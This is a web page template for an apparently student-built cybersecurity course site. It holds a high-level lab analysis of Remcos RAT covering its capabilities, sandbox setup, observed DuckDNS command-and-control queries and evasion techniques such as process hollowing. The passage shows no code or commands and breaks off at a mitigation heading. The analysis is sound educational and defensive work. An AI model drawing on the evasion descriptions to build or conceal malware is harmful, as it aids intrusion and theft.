@extends('layouts.nexus')

@section('title', 'NEXUS - First Semester | Cybersecurity Fundamentals')

@push('styles')
<style>    /* Section Cards - Enhanced visibility with impressive animations */
    .section-card {
        background: linear-gradient(135deg, rgba(15, 23, 42, 0.95), rgba(30, 41, 59, 0.9));
        border: 3px solid rgba(14, 165, 233, 0.4);
        backdrop-filter: blur(20px);
        transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
        position: relative;
        overflow: hidden;
        cursor: pointer;
        min-height: 350px;
        box-shadow: 0 15px 40px rgba(14, 165, 233, 0.15);
        transform-style: preserve-3d;
    }

    .section-card::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(14, 165, 233, 0.3), transparent);
        transition: left 1s ease;
        z-index: 1;
    }

    .section-card::after {
        content: '';
        position: absolute;
        inset: 0;
        background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.05), transparent);
        opacity: 0;
        transition: all 0.8s ease;
        z-index: 2;
    }

    .section-card:hover::before {
        left: 100%;
    }

    .section-card:hover::after {
        opacity: 1;
        transform: scale(1.1) rotate(1deg);
    }

    .section-card:hover {
        transform: translateY(-20px) scale(1.08) rotateY(5deg);
        border-color: #0ea5e9;
        box-shadow: 
            0 35px 70px rgba(14, 165, 233, 0.5),
            0 25px 50px rgba(168, 85, 247, 0.4),
            inset 0 2px 0 rgba(255, 255, 255, 0.2),
            0 0 60px rgba(14, 165, 233, 0.3);
    }

    /* Card content animations */
    .section-card .card-content {
        position: relative;
        z-index: 3;
        transition: all 0.6s ease;
    }

    .section-card:hover .card-content {
        transform: translateZ(20px);
    }

    /* Icon animations */
    .section-card .card-icon {
        transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
    }

    .section-card:hover .card-icon {
        transform: scale(1.2) rotateY(360deg);
        filter: drop-shadow(0 10px 20px rgba(14, 165, 233, 0.5));
    }

    .section-card.active {
        border-color: #06b6d4;
        background: linear-gradient(135deg, rgba(6, 182, 212, 0.2), rgba(14, 165, 233, 0.2));
    }

    /* Section Content Areas */
    .section-content {
        display: none;
        opacity: 0;
        transform: translateY(20px);
        transition: opacity 0.5s ease, transform 0.5s ease;
    }

    .section-content.active {
        display: block;
        opacity: 1;
        transform: translateY(0);
    }

    /* Encryption Section Enhancements */
    .encryption-demo {
        background: linear-gradient(135deg, rgba(6, 182, 212, 0.15), rgba(168, 85, 247, 0.15));
        border: 2px solid rgba(6, 182, 212, 0.4);
        backdrop-filter: blur(20px);
        transition: all 0.5s ease;
        min-height: 500px;
        position: relative;
        overflow: hidden;
    }

    .encryption-demo::before {
        content: '';
        position: absolute;
        inset: 0;
        background: linear-gradient(45deg, transparent, rgba(6, 182, 212, 0.1), transparent);
        opacity: 0;
        transition: all 0.5s ease;
    }

    .encryption-demo:hover::before {
        opacity: 1;
    }

    .encryption-demo:hover {
        border-color: #06b6d4;
        box-shadow: 0 20px 50px rgba(6, 182, 212, 0.3);
        transform: translateY(-5px);
    }

    /* File encryption styles */
    .file-upload-area {
        border: 3px dashed rgba(6, 182, 212, 0.5);
        background: rgba(15, 23, 42, 0.8);
        transition: all 0.3s ease;
        min-height: 120px;
    }

    .file-upload-area:hover {
        border-color: #06b6d4;
        background: rgba(6, 182, 212, 0.1);
    }

    .file-upload-area.dragover {
        border-color: #0ea5e9;
        background: rgba(14, 165, 233, 0.2);
        transform: scale(1.02);
    }    /* Enhanced video player - Responsive Design */
    .video-container {
        position: relative;
        background: rgba(15, 23, 42, 0.9);
        border-radius: 12px;
        overflow: hidden;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        width: 100%;
        aspect-ratio: 16/9;
    }

    .video-container video {
        width: 100%;
        height: 100%;
        object-fit: contain;
        border-radius: 12px;
    }

    /* Responsive video controls */
    @media (max-width: 768px) {
        .video-container {
            aspect-ratio: 16/9;
            min-height: 200px;
        }
        
        .video-container video {
            object-fit: cover;
        }
    }

    @media (max-width: 480px) {
        .video-container {
            aspect-ratio: 4/3;
            min-height: 180px;
        }
    }

    /* Decryption section styles */
    .decryption-section {
        background: linear-gradient(135deg, rgba(168, 85, 247, 0.15), rgba(236, 72, 153, 0.15));
        border: 2px solid rgba(168, 85, 247, 0.4);
        backdrop-filter: blur(20px);
        border-radius: 16px;
        padding: 24px;
        margin-top: 24px;
    }

    /* Enhanced spacing and layout */
    .encryption-grid {
        display: grid;
        grid-template-columns: 1fr;
        gap: 2rem;
    }

    @media (min-width: 1024px) {
        .encryption-grid {
            grid-template-columns: repeat(2, 1fr);
        }
    }

    @media (min-width: 1280px) {
        .encryption-grid {
            grid-template-columns: repeat(3, 1fr);
        }
    }

    .encrypt-btn {
        background: linear-gradient(45deg, #0ea5e9, #06b6d4);
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
    }

    .encrypt-btn::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.2), transparent);
        transition: left 0.5s ease;
    }

    .encrypt-btn:hover::before {
        left: 100%;
    }

    .encrypt-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 10px 25px rgba(14, 165, 233, 0.4);
    }

    /* Algorithm Cards */
    .algo-card {
        background: linear-gradient(135deg, rgba(15, 23, 42, 0.8), rgba(30, 41, 59, 0.6));
        border: 1px solid rgba(14, 165, 233, 0.2);
        transition: all 0.4s ease;
    }

    .algo-card:hover {
        border-color: #0ea5e9;
        transform: translateY(-5px);
        box-shadow: 0 15px 30px rgba(14, 165, 233, 0.2);
    }

    /* Input Styling */
    .nexus-input {
        background: rgba(15, 23, 42, 0.8);
        border: 2px solid rgba(14, 165, 233, 0.3);
        color: white;
        transition: all 0.3s ease;
    }

    .nexus-input:focus {
        border-color: #0ea5e9;
        box-shadow: 0 0 20px rgba(14, 165, 233, 0.3);
        outline: none;
    }

    /* Back Button */
    .back-btn {
        background: linear-gradient(45deg, #374151, #4b5563);
        transition: all 0.3s ease;
    }

    .back-btn:hover {
        background: linear-gradient(45deg, #4b5563, #6b7280);
        transform: translateX(-5px);
    }

    /* Make sure overview section is visible */
    #overview {
        opacity: 1;
        transform: none;
        transition: opacity 0.5s ease;
    }

    #overview.hidden {
        display: none;
        opacity: 0;
    }

    /* Enhanced Responsive Design */
    @media (max-width: 1024px) {
        .encryption-grid {
            grid-template-columns: 1fr;
            gap: 1.5rem;
        }
        
        .section-card {
            min-height: 300px;
            padding: 1.5rem;
        }
        
        .section-card:hover {
            transform: translateY(-10px) scale(1.03);
        }
    }

    @media (max-width: 768px) {
        .section-card {
            min-height: 280px;
            padding: 1.25rem;
        }
        
        .section-card .card-icon {
            width: 64px;
            height: 64px;
        }
        
        .section-card h3 {
            font-size: 1.5rem;
        }
        
        .encryption-demo {
            padding: 1.5rem;
            min-height: 400px;
        }
        
        .file-upload-area {
            min-height: 100px;
            padding: 1.5rem;
        }
    }

    @media (max-width: 480px) {
        .section-card {
            min-height: 250px;
            padding: 1rem;
        }
        
        .encryption-demo {
            padding: 1rem;
            min-height: 350px;
        }
        
        .algo-card {
            padding: 1rem;
        }
    }

    /* Loading States */
    .loading {
        position: relative;
        overflow: hidden;
    }

    .loading::after {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(14, 165, 233, 0.3), transparent);
        animation: loading-shimmer 1.5s infinite;
    }

    @keyframes loading-shimmer {
        0% { left: -100%; }
        100% { left: 100%; }
    }

    /* Success Animations */
    .success-bounce {
        animation: successBounce 0.6s ease-out;
    }    @keyframes successBounce {
        0% { transform: scale(0.8); opacity: 0; }
        50% { transform: scale(1.1); opacity: 1; }
        100% { transform: scale(1); opacity: 1; }
    }

    /* Error States */
    .error-shake {
        animation: errorShake 0.5s ease-in-out;
    }

    @keyframes errorShake {
        0%, 100% { transform: translateX(0); }
        25% { transform: translateX(-5px); }
        75% { transform: translateX(5px); }
    }

    /* Pulse Effect for Interactive Elements */
    .pulse-on-hover:hover {
        animation: pulse 2s infinite;
    }

    @keyframes pulse {
        0% { box-shadow: 0 0 0 0 rgba(14, 165, 233, 0.4); }
        70% { box-shadow: 0 0 0 10px rgba(14, 165, 233, 0); }
        100% { box-shadow: 0 0 0 0 rgba(14, 165, 233, 0); }
    }

    /* Section Content - Initial hidden state */
    .section-content {
        display: none;
    }

    /* Active state for section content */
    .section-content.active {
        display: block;
        animation: fadeIn 0.8s ease-out;
    }

    @keyframes fadeIn {
        from {
            opacity: 0;
            transform: translateY(10px);
        }
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }    /* Encryption Section Enhancements */
    .encryption-demo {
        background: linear-gradient(135deg, rgba(6, 182, 212, 0.15), rgba(168, 85, 247, 0.15));
        border: 2px solid rgba(6, 182, 212, 0.4);
        backdrop-filter: blur(20px);
        transition: all 0.5s ease;
        min-height: 500px;
        position: relative;
        overflow: hidden;
    }

    .encryption-demo::before {
        content: '';
        position: absolute;
        inset: 0;
        background: linear-gradient(45deg, transparent, rgba(6, 182, 212, 0.1), transparent);
        opacity: 0;
        transition: all 0.5s ease;
    }

    .encryption-demo:hover::before {
        opacity: 1;
    }

    .encryption-demo:hover {
        border-color: #06b6d4;
        box-shadow: 0 20px 50px rgba(6, 182, 212, 0.3);
        transform: translateY(-5px);
    }

    /* File encryption styles */
    .file-upload-area {
        border: 3px dashed rgba(6, 182, 212, 0.5);
        background: rgba(15, 23, 42, 0.8);
        transition: all 0.3s ease;
        min-height: 120px;
    }

    .file-upload-area:hover {
        border-color: #06b6d4;
        background: rgba(6, 182, 212, 0.1);
    }

    .file-upload-area.dragover {
        border-color: #0ea5e9;
        background: rgba(14, 165, 233, 0.2);
        transform: scale(1.02);
    }    /* Enhanced video player - Responsive Design */
    .video-container {
        position: relative;
        background: rgba(15, 23, 42, 0.9);
        border-radius: 12px;
        overflow: hidden;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        width: 100%;
        aspect-ratio: 16/9;
    }

    .video-container video {
        width: 100%;
        height: 100%;
        object-fit: contain;
        border-radius: 12px;
    }

    /* Responsive video controls */
    @media (max-width: 768px) {
        .video-container {
            aspect-ratio: 16/9;
            min-height: 200px;
        }
        
        .video-container video {
            object-fit: cover;
        }
    }

    @media (max-width: 480px) {
        .video-container {
            aspect-ratio: 4/3;
            min-height: 180px;
        }
    }

    /* Decryption section styles */
    .decryption-section {
        background: linear-gradient(135deg, rgba(168, 85, 247, 0.15), rgba(236, 72, 153, 0.15));
        border: 2px solid rgba(168, 85, 247, 0.4);
        backdrop-filter: blur(20px);
        border-radius: 16px;
        padding: 24px;
        margin-top: 24px;
    }

    /* Enhanced spacing and layout */
    .encryption-grid {
        display: grid;
        grid-template-columns: 1fr;
        gap: 2rem;
    }

    @media (min-width: 1024px) {
        .encryption-grid {
            grid-template-columns: repeat(2, 1fr);
        }
    }

    @media (min-width: 1280px) {
        .encryption-grid {
            grid-template-columns: repeat(3, 1fr);
        }
    }

    .encrypt-btn {
        background: linear-gradient(45deg, #0ea5e9, #06b6d4);
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
    }

    .encrypt-btn::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.2), transparent);
        transition: left 0.5s ease;
    }

    .encrypt-btn:hover::before {
        left: 100%;
    }

    .encrypt-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 10px 25px rgba(14, 165, 233, 0.4);
    }

    /* Algorithm Cards */
    .algo-card {
        background: linear-gradient(135deg, rgba(15, 23, 42, 0.8), rgba(30, 41, 59, 0.6));
        border: 1px solid rgba(14, 165, 233, 0.2);
        transition: all 0.4s ease;
    }

    .algo-card:hover {
        border-color: #0ea5e9;
        transform: translateY(-5px);
        box-shadow: 0 15px 30px rgba(14, 165, 233, 0.2);
    }

    /* Input Styling */
    .nexus-input {
        background: rgba(15, 23, 42, 0.8);
        border: 2px solid rgba(14, 165, 233, 0.3);
        color: white;
        transition: all 0.3s ease;
    }

    .nexus-input:focus {
        border-color: #0ea5e9;
        box-shadow: 0 0 20px rgba(14, 165, 233, 0.3);
        outline: none;
    }

    /* Back Button */
    .back-btn {
        background: linear-gradient(45deg, #374151, #4b5563);
        transition: all 0.3s ease;
    }

    .back-btn:hover {
        background: linear-gradient(45deg, #4b5563, #6b7280);
        transform: translateX(-5px);
    }

    /* Make sure overview section is visible */
    #overview {
        display: block !important;
    }
</style>
@endpush

@section('content')
<div class="max-w-6xl mx-auto">
    <!-- Overview Section - ALWAYS VISIBLE BY DEFAULT -->
    <section id="overview" style="display: block !important;">
        <!-- Hero Section -->
        <div class="text-center mb-16">
            <h1 class="text-5xl md:text-7xl font-black mb-6">
                <span class="bg-gradient-to-r from-blue-400 via-cyan-400 to-teal-400 bg-clip-text text-transparent">
                    CYBERSECURITY
                </span>
            </h1>
            <h2 class="text-3xl md:text-4xl font-bold text-white mb-6">
                FUNDAMENTALS
            </h2>
            <p class="text-xl text-gray-300 max-w-3xl mx-auto leading-relaxed mb-12">
                Master the essential foundations of cybersecurity through four comprehensive learning modules. 
                Build your expertise from encryption basics to advanced security operations.
            </p>
            <p class="text-lg text-cyan-400 font-semibold mb-8">
                Choose a specialization to begin your cybersecurity journey:
            </p>
        </div>        <!-- 4 SECTION SELECTION CARDS - ENHANCED WITH IMPRESSIVE ANIMATIONS -->
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-10 mb-16">            <!-- 1. ENCRYPTION SECTION CARD -->
            <a href="{{ route('nexus.encryption') }}" class="section-card rounded-2xl p-8 text-center no-underline block" data-section="encryption">
                <div class="card-content">
                    <div class="card-icon w-20 h-20 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg">
                        <i class="fas fa-lock text-3xl text-white"></i>
                    </div>
                    <h3 class="text-2xl font-bold text-white mb-4">ENCRYPTION</h3>
                    <p class="text-gray-300 mb-6 text-sm leading-relaxed">Master cryptographic algorithms, secure communications, and data protection techniques with hands-on labs.</p>
                    <div class="flex items-center justify-center space-x-2 text-cyan-400 font-semibold">
                        <i class="fas fa-play-circle"></i>
                        <span>Interactive Demos</span>
                    </div>
                    <div class="mt-4 text-xs text-gray-500">
                        ✓ Text, File & Video Encryption<br>
                        ✓ AES, RSA, SHA Algorithms<br>
                        ✓ Real-time Results
                    </div>
                </div>
            </a><!-- 2. RAT ANALYSIS CARD -->
            <div class="section-card rounded-2xl p-8 text-center" data-section="rat-analysis">
                <div class="card-content">
                    <div class="card-icon w-20 h-20 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg">
                        <i class="fas fa-search-plus text-3xl text-white"></i>
                    </div>
                    <h3 class="text-2xl font-bold text-white mb-4">RAT ANALYSIS</h3>
                    <p class="text-gray-300 mb-6 text-sm leading-relaxed">Analyze Remote Access Trojans (RATs) through comprehensive behavioral and code analysis techniques.</p>
                    <div class="flex items-center justify-center space-x-2 text-purple-400 font-semibold">
                        <i class="fas fa-microscope"></i>
                        <span>Interactive Analysis</span>
                    </div>
                    <div class="mt-4 text-xs text-gray-500">
                        • Behavioral Analysis<br>
                        • Network Communication<br>
                        • Detection Methods
                    </div>
                </div>
            </div>            <!-- 3. SNAKE KEYLOGGER ANALYSIS CARD -->
            <div class="section-card rounded-2xl p-8 text-center" data-section="snake-keylogger">
                <div class="card-content">
                    <div class="card-icon w-20 h-20 bg-gradient-to-r from-red-500 to-orange-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg">
                        <i class="fas fa-keyboard text-3xl text-white"></i>
                    </div>
                    <h3 class="text-2xl font-bold text-white mb-4">SNAKE KEYLOGGER</h3>
                    <p class="text-gray-300 mb-6 text-sm leading-relaxed">Deep dive into Snake Keylogger malware analysis, detection patterns, and defense mechanisms.</p>
                    <div class="flex items-center justify-center space-x-2 text-red-400 font-semibold">
                        <i class="fas fa-bug"></i>
                        <span>Live Analysis</span>
                    </div>
                    <div class="mt-4 text-xs text-gray-500">
                        • Keylogging Techniques<br>
                        • Evasion Methods<br>
                        • Detection & Mitigation
                    </div>
                </div>
            </div>            <!-- 4. NEXUS FLOWCHART CARD -->
            <div class="section-card rounded-2xl p-8 text-center" data-section="nexus-flowchart">
                <div class="card-content">
                    <div class="card-icon w-20 h-20 bg-gradient-to-r from-green-500 to-emerald-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg">
                        <i class="fas fa-project-diagram text-3xl text-white"></i>
                    </div>
                    <h3 class="text-2xl font-bold text-white mb-4">NEXUS FLOWCHART</h3>
                    <p class="text-gray-300 mb-6 text-sm leading-relaxed">Explore the complete NEXUS project workflow and methodology through interactive diagrams.</p>
                    <div class="flex items-center justify-center space-x-2 text-green-400 font-semibold">
                        <i class="fas fa-sitemap"></i>
                        <span>Interactive Flow</span>
                    </div>
                    <div class="mt-4 text-xs text-gray-500">
                        • Project Architecture<br>
                        • Workflow Process<br>
                        • Research Methodology
                    </div>
                </div>
            </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Progress Stats -->
        <div class="grid grid-cols-1 md:grid-cols-4 gap-8 bg-gray-800/30 rounded-2xl p-8 backdrop-blur-sm border border-gray-700">
            <div class="text-center">
                <div class="text-4xl font-bold text-cyan-400 mb-2">4</div>
                <div class="text-gray-300 text-sm">Core Specializations</div>
            </div>
            <div class="text-center">
                <div class="text-4xl font-bold text-purple-400 mb-2">12+</div>
                <div class="text-gray-300 text-sm">Interactive Tools</div>
            </div>
            <div class="text-center">
                <div class="text-4xl font-bold text-pink-400 mb-2">∞</div>
                <div class="text-gray-300 text-sm">Learning Paths</div>
            </div>
            <div class="text-center">
                <div class="text-4xl font-bold text-green-400 mb-2">24/7</div>
                <div class="text-gray-300 text-sm">Access</div>
            </div>
        </div>        <!-- Call to Action -->
        <div class="text-center mt-16">
            <div class="flex flex-col md:flex-row gap-4 justify-center items-center">
                <a href="{{ route('nexus.encryption') }}" class="encrypt-btn px-8 py-4 rounded-lg text-white font-bold text-lg flex items-center space-x-2 no-underline">
                    <i class="fas fa-rocket"></i>
                    <span>Start with Encryption</span>                </a>
            </div>
        </div>    </section>

    <!-- RAT ANALYSIS SECTION - COMPREHENSIVE REAL-WORLD ANALYSIS --><!-- RAT ANALYSIS SECTION - COMPREHENSIVE REAL-WORLD ANALYSIS -->
    <section id="rat-analysis" class="section-content">
        <div class="mb-8">
            <button onclick="showOverview()" class="back-btn px-6 py-3 rounded-lg text-white font-semibold flex items-center space-x-2 hover:bg-gray-600">
                <i class="fas fa-arrow-left"></i>
                <span>Back to Overview</span>
            </button>
        </div>
        
        <div class="text-center mb-16">
            <h1 class="text-4xl md:text-6xl font-black mb-6">
                <span class="bg-gradient-to-r from-purple-400 via-pink-400 to-red-400 bg-clip-text text-transparent">
                    RAT ANALYSIS
                </span>
            </h1>
            <p class="text-xl text-gray-300 max-w-4xl mx-auto leading-relaxed mb-8">
                Real-world analysis of <strong>Remcos RAT</strong> - A comprehensive study of Remote Access Trojan behavior, 
                network communications, and detection methodologies using controlled virtual environment testing.
            </p>
        </div>

        <!-- Malware Overview Section -->
        <div class="bg-gradient-to-r from-purple-900/20 to-pink-900/20 rounded-2xl p-8 border border-purple-500/30 mb-16">
            <div class="flex items-center mb-6">
                <div class="w-16 h-16 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center mr-4">
                    <i class="fas fa-bug text-white text-2xl"></i>
                </div>
                <h2 class="text-3xl font-bold text-white">Remcos RAT Overview</h2>
            </div>
            
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
                <div class="space-y-4">
                    <p class="text-gray-300 leading-relaxed">
                        <strong class="text-purple-400">Remote Access Trojans (RATs)</strong> were initially developed for legitimate purposes 
                        such as surveillance and penetration testing. However, they have been extensively abused by cybercriminals 
                        to secretly control victims' devices and steal sensitive information.
                    </p>
                    
                    <div class="bg-gray-800/50 rounded-lg p-4">
                        <h4 class="text-pink-400 font-semibold mb-3">Core Capabilities</h4>
                        <ul class="text-gray-300 text-sm space-y-2">
                            <li>• <strong>Information Theft:</strong> System metadata, credentials, keystrokes</li>
                            <li>• <strong>Remote Command Execution:</strong> Full system control</li>
                            <li>• <strong>Backdoor Creation:</strong> Persistent access maintenance</li>
                            <li>• <strong>Evasion Techniques:</strong> Anti-detection mechanisms</li>
                        </ul>
                    </div>
                </div>
                
                <div class="bg-gray-800/50 rounded-lg p-6">
                    <h4 class="text-red-400 font-semibold mb-4">Detailed Attack Vector Capabilities</h4>
                    <div class="grid grid-cols-1 gap-3 text-sm">
                        <div class="flex items-start space-x-2">
                            <i class="fas fa-download text-red-400 mt-1"></i>
                            <span class="text-gray-300">File harvesting and exfiltration</span>
                        </div>
                        <div class="flex items-start space-x-2">
                            <i class="fas fa-cogs text-red-400 mt-1"></i>
                            <span class="text-gray-300">Process enumeration and termination</span>
                        </div>
                        <div class="flex items-start space-x-2">
                            <i class="fas fa-server text-red-400 mt-1"></i>
                            <span class="text-gray-300">System service management</span>
                        </div>
                        <div class="flex items-start space-x-2">
                            <i class="fas fa-edit text-red-400 mt-1"></i>
                            <span class="text-gray-300">Windows Registry manipulation</span>
                        </div>
                        <div class="flex items-start space-x-2">
                            <i class="fas fa-clipboard text-red-400 mt-1"></i>
                            <span class="text-gray-300">Clipboard content capture</span>
                        </div>
                        <div class="flex items-start space-x-2">
                            <i class="fas fa-camera text-red-400 mt-1"></i>
                            <span class="text-gray-300">Camera and microphone activation</span>
                        </div>
                        <div class="flex items-start space-x-2">
                            <i class="fas fa-desktop text-red-400 mt-1"></i>
                            <span class="text-gray-300">Desktop wallpaper alteration</span>
                        </div>
                        <div class="flex items-start space-x-2">
                            <i class="fas fa-video text-red-400 mt-1"></i>
                            <span class="text-gray-300">Screen recording capabilities</span>
                        </div>
                        <div class="flex items-start space-x-2">
                            <i class="fas fa-keyboard text-red-400 mt-1"></i>
                            <span class="text-gray-300">Input device disabling</span>
                        </div>
                        <div class="flex items-start space-x-2">
                            <i class="fas fa-door-open text-red-400 mt-1"></i>
                            <span class="text-gray-300">Backdoor installation</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Lab Environment Setup -->
        <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-purple-500/20 mb-16">
            <div class="flex items-center mb-6">
                <div class="w-16 h-16 bg-gradient-to-r from-blue-500 to-purple-500 rounded-full flex items-center justify-center mr-4">
                    <i class="fas fa-flask text-white text-2xl"></i>
                </div>
                <h2 class="text-3xl font-bold text-white">Laboratory Environment Setup</h2>
            </div>
            
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
                <div class="space-y-4">
                    <div class="bg-gray-800/50 rounded-lg p-6">
                        <h4 class="text-blue-400 font-semibold mb-3">Virtual Machine Configuration</h4>
                        <ul class="text-gray-300 text-sm space-y-2">
                            <li>• <strong>Platform:</strong> VMware Workstation Pro</li>
                            <li>• <strong>OS:</strong> Windows 10 Pro (Clean Installation)</li>
                            <li>• <strong>Network:</strong> Host-Only Adapter (Isolated)</li>
                            <li>• <strong>Security:</strong> Windows Defender Disabled</li>
                            <li>• <strong>Integration:</strong> VMware Tools Removed</li>
                        </ul>
                    </div>
                    
                    <div class="bg-gray-800/50 rounded-lg p-6">
                        <h4 class="text-purple-400 font-semibold mb-3">Monitoring Tools</h4>
                        <ul class="text-gray-300 text-sm space-y-2">
                            <li>• <strong>Network Analysis:</strong> Wireshark Packet Capture</li>
                            <li>• <strong>Process Monitoring:</strong> Process Manager</li>
                            <li>• <strong>Sample Source:</strong> Malware Bazaar</li>
                        </ul>
                    </div>
                </div>
                
                <div class="bg-gray-800/50 rounded-lg p-6">
                    <h4 class="text-green-400 font-semibold mb-4">Security Isolation Measures</h4>
                    <div class="space-y-3">
                        <div class="flex items-center space-x-3">
                            <i class="fas fa-shield-alt text-green-400"></i>
                            <span class="text-gray-300 text-sm">Host-only networking prevents home network exposure</span>
                        </div>
                        <div class="flex items-center space-x-3">
                            <i class="fas fa-times-circle text-green-400"></i>
                            <span class="text-gray-300 text-sm">File sharing integration completely disabled</span>
                        </div>
                        <div class="flex items-center space-x-3">
                            <i class="fas fa-lock text-green-400"></i>
                            <span class="text-gray-300 text-sm">VM tools removed for enhanced security</span>
                        </div>
                        <div class="flex items-center space-x-3">
                            <i class="fas fa-ban text-green-400"></i>
                            <span class="text-gray-300 text-sm">Antivirus disabled to allow malware execution</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Analysis Results and Evidence -->
        <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-red-500/20 mb-16">
            <div class="flex items-center mb-6">
                <div class="w-16 h-16 bg-gradient-to-r from-red-500 to-orange-500 rounded-full flex items-center justify-center mr-4">
                    <i class="fas fa-search text-white text-2xl"></i>
                </div>
                <h2 class="text-3xl font-bold text-white">Analysis Results & Evidence</h2>
            </div>

            <!-- Network Traffic Analysis -->
            <div class="mb-8">
                <h3 class="text-2xl font-bold text-red-400 mb-4">Network Traffic Analysis</h3>
                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    <div class="bg-gray-800/50 rounded-lg p-6">
                        <h4 class="text-orange-400 font-semibold mb-3">DNS Query Analysis</h4>
                        <p class="text-gray-300 text-sm mb-4">
                            Upon execution, the RAT immediately generated suspicious DNS queries to DUCKDNS domains, 
                            revealing command and control infrastructure despite the offline environment.
                        </p>
                        <img src="/images/RAT/s1.png" alt="DNS Traffic Analysis" class="w-full rounded-lg border border-gray-600 mb-3">
                        <p class="text-xs text-gray-400 italic">Figure 1: Wireshark capture showing malicious DNS queries to compromised DUCKDNS infrastructure</p>
                    </div>
                    
                    <div class="bg-gray-800/50 rounded-lg p-6">
                        <h4 class="text-orange-400 font-semibold mb-3">Threat Intelligence Discovery</h4>
                        <p class="text-gray-300 text-sm mb-4">
                            Investigation revealed a Russian cybercriminal group (AS198953) actively abusing DUCKDNS 
                            for cryptocurrency scams, phishing operations, and data theft campaigns.
                        </p>
                        <img src="/images/RAT/s2.png" alt="Threat Intelligence" class="w-full rounded-lg border border-gray-600 mb-3">
                        <p class="text-xs text-gray-400 italic">Figure 2: URLScan.io analysis revealing malicious infrastructure patterns</p>
                    </div>
                </div>
            </div>

            <!-- Process Behavior Analysis -->
            <div class="mb-8">
                <h3 class="text-2xl font-bold text-red-400 mb-4">Process Behavior & Data Access Attempts</h3>
                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    <div class="bg-gray-800/50 rounded-lg p-6">
                        <h4 class="text-orange-400 font-semibold mb-3">Data Exfiltration Attempts</h4>
                        <p class="text-gray-300 text-sm mb-4">
                            Process Manager captured multiple attempts by the RAT to access system data, 
                            demonstrating its data harvesting capabilities in real-time.
                        </p>
                        <img src="/images/RAT/s4.png" alt="Process Analysis" class="w-full rounded-lg border border-gray-600 mb-3">
                        <p class="text-xs text-gray-400 italic">Figure 3: Process Manager showing RAT data access attempts</p>
                    </div>
                    
                    <div class="bg-gray-800/50 rounded-lg p-6">
                        <h4 class="text-orange-400 font-semibold mb-3">Criminal Infrastructure Evidence</h4>
                        <p class="text-gray-300 text-sm mb-4">
                            Further analysis exposed the extent of the criminal operation, including Bitcoin scams 
                            and various fraudulent activities hosted on the compromised infrastructure.
                        </p>
                        <img src="/images/RAT/s3.png" alt="Criminal Evidence" class="w-full rounded-lg border border-gray-600 mb-3">
                        <p class="text-xs text-gray-400 italic">Figure 4: Evidence of cryptocurrency scams and fraudulent operations</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Evasion Techniques -->
        <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-yellow-500/20 mb-16">
            <div class="flex items-center mb-6">
                <div class="w-16 h-16 bg-gradient-to-r from-yellow-500 to-orange-500 rounded-full flex items-center justify-center mr-4">
                    <i class="fas fa-mask text-white text-2xl"></i>
                </div>
                <h2 class="text-3xl font-bold text-white">Advanced Evasion Techniques</h2>
            </div>
            
            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div class="bg-gray-800/50 rounded-lg p-6">
                    <div class="flex items-center mb-4">
                        <i class="fas fa-code text-yellow-400 text-xl mr-3"></i>
                        <h4 class="text-yellow-400 font-semibold">Code Obfuscation</h4>
                    </div>
                    <p class="text-gray-300 text-sm">
                        Multi-layered obfuscation using JavaScript, VBScript, and PowerShell 
                        to evade static analysis detection methods.
                    </p>
                </div>
                
                <div class="bg-gray-800/50 rounded-lg p-6">
                    <div class="flex items-center mb-4">
                        <i class="fas fa-bug text-yellow-400 text-xl mr-3"></i>
                        <h4 class="text-yellow-400 font-semibold">Anti-Debugging</h4>
                    </div>
                    <p class="text-gray-300 text-sm">
                        Active detection of debugging environments with automatic termination 
                        when analysis tools are detected.
                    </p>
                </div>
                
                <div class="bg-gray-800/50 rounded-lg p-6">
                    <div class="flex items-center mb-4">
                        <i class="fas fa-ghost text-yellow-400 text-xl mr-3"></i>
                        <h4 class="text-yellow-400 font-semibold">Process Hollowing</h4>
                    </div>
                    <p class="text-gray-300 text-sm">
                        Fileless execution by injecting malicious code into legitimate 
                        process memory space for stealth operations.
                    </p>
                </div>
            </div>
        </div>

        <!-- Mitigation Strategies -->
        <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-green-500/20 mb-16">
            <div class="flex items-center mb-6">
                <div class="w-16 h-16 bg-gradient-to-r from-green-500 to-emerald-500 rounded-full flex items-center justify-center mr-4">
                    <i class="fas fa-shield-alt text-white text-2xl"></i>
                </div>
